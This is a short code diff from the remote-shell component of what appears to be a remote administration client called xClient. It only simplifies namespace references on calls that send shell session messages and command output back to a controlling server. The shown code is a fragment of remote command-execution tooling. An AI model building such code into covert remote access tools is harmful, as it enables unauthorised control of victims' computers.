@@ -27,7 +27,7 @@ namespace xClient.Core.RemoteShell
             };
 
             prc.Start();
-            new global::xClient.Core.Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(Program._Client);
+            new Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(Program._Client);
 
             new Thread(Redirect).Start();
         }
@@ -70,7 +70,7 @@ namespace xClient.Core.RemoteShell
 
                     commandResult.AppendLine();
 
-                    new global::xClient.Core.Packets.ClientPackets.ShellCommandResponse(commandResult.ToString()).Execute(Program._Client);
+                    new Packets.ClientPackets.ShellCommandResponse(commandResult.ToString()).Execute(Program._Client);
                 }
             }
             catch
@@ -107,7 +107,7 @@ namespace xClient.Core.RemoteShell
             }
             catch
             { }
-            new global::xClient.Core.Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program._Client);
+            new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program._Client);
         }
 
         public void CloseSession()
@@ -120,7 +120,7 @@ namespace xClient.Core.RemoteShell
             }
             catch
             { }
-            new global::xClient.Core.Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program._Client);
+            new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program._Client);
         }
     }
 }
